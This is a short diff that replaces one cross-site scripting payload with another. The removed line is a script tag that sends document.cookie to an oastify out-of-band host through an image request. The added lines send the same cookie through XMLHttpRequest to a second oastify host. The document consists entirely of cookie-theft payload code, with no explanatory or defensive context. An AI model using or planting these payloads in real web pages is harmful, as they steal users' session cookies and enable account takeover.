@@ -1,1 +1,3 @@
-<script>var i=new Image;i.src="http://tros25paswd4wfv6apmvpm3tdkjb72vr.oastify/?"+document.cookie;</script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "bhwasnfsie3mmxlo07cdf4tb329txlla.oastify.com/?" + document.cookie, true);
+xhr.send();
